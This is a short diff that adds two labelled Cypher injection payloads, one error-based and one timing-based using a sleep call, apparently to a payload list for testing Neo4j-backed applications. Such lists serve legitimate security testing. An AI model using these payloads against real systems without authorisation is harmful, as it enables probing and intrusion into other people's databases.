@@ -1,0 +1,4 @@
+##Cypher Injection - Error-Based##
+' OR 1=1 RETURN 7*191 //
+##Cypher Injection - Timing-Based##
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
